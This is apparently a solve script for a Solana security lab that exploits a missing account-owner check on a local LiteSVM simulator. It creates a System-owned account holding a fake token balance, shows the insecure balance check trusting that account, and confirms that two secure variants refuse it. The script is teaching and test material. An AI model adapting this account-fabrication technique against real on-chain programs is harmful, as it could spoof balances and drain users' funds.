// L2 solve script (S10): missing-owner-check exploit, end to end on LiteSVM.
// Flow: fabricate a System-owned account with fake token balance bytes →
// check_balance_insecure TRUSTS it (reads the fake amount) → both secure
// variants MUST refuse the same account (negative control).
// Exits 0 with PASS; non-zero naming the miss otherwise.
// Usage: node solve-l2.mjs [path-to-l2_owner.so]
import { createHash } from "node:crypto";
import { LiteSVM, FailedTransactionMetadata } from "litesvm";
import {
	AccountRole,
	address,
	appendTransactionMessageInstruction,
	createTransactionMessage,
	generateKeyPairSigner,
	lamports,
	pipe,
	setTransactionMessageFeePayerSigner,
	signTransactionMessageWithSigners
} from "@solana/kit";
import { SYSTEM_PROGRAM_ADDRESS } from "@solana-program/system";

const PROGRAM = address("Cm1MRpNCGCVXbft2uKoqhQ81Huw3uUCVnxzBEHqUYwNz");
const TOKEN_PROGRAM = address("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA");
const SO =
	process.argv[2] ??
	"/home/aleksic/spacestation/mvp/content/programs/l2-owner/l2_owner.so";
const FAKE_BALANCE = 1_000_000n;

const disc = (name) =>
	Uint8Array.from(createHash("sha256").update(`global:${name}`).digest().subarray(0, 8));

const u64le = (n) => {
	const b = Buffer.alloc(8);
	b.writeBigUInt64LE(n);
	return new Uint8Array(b);
};

const fail = (why) => {
	console.error(`SOLVE FAIL: ${why}`);
	process.exit(1);
};

const svm = new LiteSVM();
const attacker = await generateKeyPairSigner();
const fake = await generateKeyPairSigner();
svm.airdrop(attacker.address, lamports(1_000_000_000n));
svm.addProgramFromFile(PROGRAM, SO);

// Fabricate: System-owned account, token-shaped bytes, fake amount at [64..72].
const bytes = Buffer.alloc(80, 0);
Buffer.from(u64le(FAKE_BALANCE)).copy(bytes, 64);
svm.setAccount({
	address: fake.address,
	lamports: 1_000_000,
	data: new Uint8Array(bytes),
	programAddress: SYSTEM_PROGRAM_ADDRESS,
	executable: false
});

async function send(ix, payer) {
	const tx = await pipe(
		createTransactionMessage({ version: 0 }),
		(tx) => setTransactionMessageFeePayerSigner(payer, tx),
		(tx) => svm.setTransactionMessageLifetimeUsingLatestBlockhash(tx),
		(tx) => appendTransactionMessageInstruction(ix, tx),
		(tx) => signTransactionMessageWithSigners(tx)
	);
	return svm.sendTransaction(tx);
}

// 1. Insecure path trusts the fabrication.
{
	const r = await send(
		{
			programAddress: PROGRAM,
			accounts: [{ address: fake.address, role: AccountRole.READONLY }],
			data: disc("check_balance_insecure")
		},
		attacker
	);
	if (r instanceof FailedTransactionMetadata) fail(`insecure refused fabrication (bug absent?): ${r.err()}`);
	console.log(`SOLVE: insecure trusted fake balance ${FAKE_BALANCE} from System-owned account`);
}

// 2. Negative controls: both secure variants MUST refuse the same account.
for (const [name, ix] of [
	["manual", {
		programAddress: PROGRAM,
		accounts: [{ address: fake.address, role: AccountRole.READONLY }],
		data: disc("check_balance_secure_manual")
	}],
	["anchor", {
		programAddress: PROGRAM,
		accounts: [
			{ address: fake.address, role: AccountRole.READONLY },
			{ address: attacker.address, role: AccountRole.WRITABLE_SIGNER },
			{ address: TOKEN_PROGRAM, role: AccountRole.READONLY }
		],
		data: disc("check_balance_secure_anchor")
	}]
]) {
	const r = await send(ix, attacker);
	if (!(r instanceof FailedTransactionMetadata)) {
		fail(`LAB BROKEN: secure-${name} accepted the fabrication`);
	}
	console.log(`NEG-CONTROL PASS: secure-${name} refused (${r.err()})`);
}
console.log(`SOLVE PASS: fake ${FAKE_BALANCE} trusted by insecure, refused by both secure`);
